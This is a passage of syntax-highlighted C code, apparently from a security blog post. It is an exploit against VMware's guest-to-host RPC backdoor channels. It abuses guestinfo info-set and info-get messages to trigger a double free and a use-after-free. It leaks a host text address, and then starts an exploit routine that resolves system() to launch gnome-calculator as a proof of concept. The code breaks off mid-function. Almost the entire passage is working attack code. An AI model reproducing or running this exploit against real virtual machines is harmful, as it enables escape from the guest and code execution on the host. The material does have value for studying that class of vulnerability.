operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s21<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//strlen(s21) = 0x100</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s21<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//second step free the reply and let the other channel get it.</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//free the output buffer</span>    <span class="token comment">//printf("Freeing the buffer....,bp:0x5555556DD3EF\n");</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now let's free\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"then alloc channel 1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//finished sending the command, should get the freed buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"check if channel 1's buffer == channel 0's buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//third step,free it again</span>    <span class="token comment">//set status to be 4</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the buffer again...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"check the heap, our target buffer in tcache now!\nTrying to reuse the buffer as a struct, which we can leak..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Should be done.Check the buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xf818d0</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leak Success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//the exploit step is almost the same as the leak ones</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.b"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> pay1 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95B8</span><span class="token punctuation">;</span>     <span class="token class-name">uint64_t</span> pay2 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xECFE0</span><span class="token punctuation">;</span> <span class="token comment">//system</span>    <span class="token class-name">uint64_t</span> pay3 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95C8</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pay4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token comment">//run_cmd(s1);</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span>s1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this time free firstly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span 